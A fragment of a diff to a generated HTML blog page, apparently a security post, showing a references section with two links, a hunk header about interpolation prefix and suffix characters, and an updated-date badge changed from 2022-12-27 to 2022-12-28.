+</span></span></code></pre></td></tr></table></div>
+</div>
+</div><h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>参考</h2>
 <p><a href="https://tttang.com/archive/1378/#toc_0x00" target="_blank" rel="noopener">https://tttang.com/archive/1378/#toc_0x00</a>
 <a href="https://www.cnpanda.net/sec/1114.html" target="_blank" rel="noopener">https://www.cnpanda.net/sec/1114.html</a></p>
 
@@ -363,9 +472,9 @@ DEFAULT_EACAPE是<code>$</code>,前缀是<code>${</code>，后缀是<code>}</cod
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-12-27 18:28:18 CST" style="cursor:help">
+        <span title="Updated @ 2022-12-28 14:02:58 CST" style="cursor:help">
 
-<svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-12-27</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-12-27</text></g></svg>
+<svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-12-28</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-12-28</text></g></svg>
         </span></div>
 
 
